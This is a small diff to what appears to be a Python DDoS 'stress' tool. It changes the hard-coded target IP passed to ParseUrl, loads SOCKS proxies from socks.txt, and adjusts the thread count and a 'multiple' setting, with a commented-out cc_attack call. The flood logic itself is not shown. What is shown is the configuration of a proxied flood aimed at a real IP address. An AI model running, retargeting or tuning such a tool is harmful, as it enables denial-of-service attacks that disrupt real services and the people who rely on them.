@@ -858,7 +858,7 @@ class stress(threading.Thread):
 		sys.exit(0)
 
 # proxies = ["80.93.212.42:3128", "168.138.211.5:8080", "178.32.47.218:22858"]
-ParseUrl("http://209.97.178.154")
+ParseUrl("http://38.27.122.103")
 thread_num = int(400)
 choice = '5'
 if choice == "4":
@@ -870,12 +870,12 @@ else:
 proxies = open('socks.txt').readlines()
 # proxies = ["72.223.168.67:4145"]
 stop = False
-thread_num = 100
 threadPool = []
+
 if __name__ == "__main__":
 	# event = threading.Event()
 	socks_type= 5
-	multiple = 200
+	multiple = 100
 
 	# th = cc_attack(socks_type,multiple)	
 	# th.daemon = True	
